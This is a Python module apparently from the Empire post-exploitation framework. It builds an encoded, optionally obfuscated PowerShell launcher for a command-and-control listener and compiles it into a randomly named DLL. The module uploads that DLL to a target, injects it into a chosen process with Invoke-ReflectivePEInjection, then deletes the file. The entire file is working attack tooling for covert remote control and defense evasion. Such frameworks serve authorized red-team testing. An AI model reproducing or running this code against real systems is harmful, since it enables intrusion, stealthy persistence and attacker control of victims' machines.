import random
import string

from empire.server.common.empire import MainMenu
from empire.server.core.module_models import EmpireModule
from empire.server.utils.module_util import handle_error_message


class Module:
    @staticmethod
    def generate(
        main_menu: MainMenu,
        module: EmpireModule,
        params: dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
    ):
        def rand_text_alphanumeric(
            size=15, chars=string.ascii_uppercase + string.digits
        ):
            return "".join(random.choice(chars) for _ in range(size))

        # staging options
        fname = rand_text_alphanumeric() + ".dll"
        listener_name = params["Listener"]
        proc_name = params["ProcName"].strip()
        upload_path = params["UploadPath"].strip()
        arch = params["Arch"].strip()
        full_upload_path = upload_path + "\\" + fname
        user_agent = params["UserAgent"]
        proxy = params["Proxy"]
        proxy_creds = params["ProxyCreds"]

        launcher_obfuscate = params["Obfuscate"].lower() == "true"
        launcher_obfuscate_command = params["ObfuscateCommand"]

        if proc_name == "":
            return handle_error_message("[!] ProcName must be specified.")

        # read in the common module source code
        script, err = main_menu.modulesv2.get_module_source(
            module_name=module.script_path,
            obfuscate=obfuscate,
            obfuscate_command=obfuscation_command,
        )

        if err:
            return handle_error_message(err)

        script_end = ""
        if not main_menu.listenersv2.get_active_listener_by_name(listener_name):
            # not a valid listener, return nothing for the script
            return handle_error_message(f"[!] Invalid listener: {listener_name}")

        # generate the PowerShell one-liner with all of the proper options set
        launcher = main_menu.stagergenv2.generate_launcher(
            listener_name,
            language="powershell",
            encode=True,
            obfuscate=launcher_obfuscate,
            obfuscation_command=launcher_obfuscate_command,
            user_agent=user_agent,
            proxy=proxy,
            proxy_creds=proxy_creds,
            bypasses=params["Bypasses"],
        )

        if launcher == "":
            return handle_error_message("[!] Error in launcher generation.")

        launcher_code = launcher.split(" ")[-1]

        script_end += f"Invoke-ReflectivePEInjection -PEPath {full_upload_path} -ProcName {proc_name} "
        dll = main_menu.stagergenv2.generate_dll(launcher_code, arch)
        upload_script = main_menu.stagergenv2.generate_upload(dll, full_upload_path)

        script += "\r\n"
        script += upload_script
        script += "\r\n"

        script_end += "\r\n"
        script_end += f"Remove-Item -Path {full_upload_path}"

        return main_menu.modulesv2.finalize_module(
            script=script,
            script_end=script_end,
            obfuscate=obfuscate,
            obfuscation_command=obfuscation_command,
        )
